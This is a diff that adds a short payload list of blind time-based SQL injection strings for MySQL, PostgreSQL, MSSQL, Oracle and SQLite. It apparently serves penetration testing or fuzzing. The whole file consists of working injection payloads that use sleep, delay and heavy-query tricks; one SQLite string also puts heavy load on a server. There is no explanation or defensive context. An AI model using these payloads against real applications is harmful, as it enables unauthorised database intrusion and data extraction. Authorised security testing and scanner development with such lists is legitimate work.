@@ -1,0 +1,20 @@
+# Database-agnostic blind time-based SQLi payloads
+
+# MySQL
+' OR SLEEP(5)--
+1' AND SLEEP(5) AND '1'='1
+' OR IF(1=1,SLEEP(5),0)--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+' OR 1=1; WAITFOR DELAY '0:0:5'--
+
+# Oracle
+' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+
+# SQLite
+' OR 1=1; SELECT CASE WHEN 1=1 THEN randomblob(100000000) END--
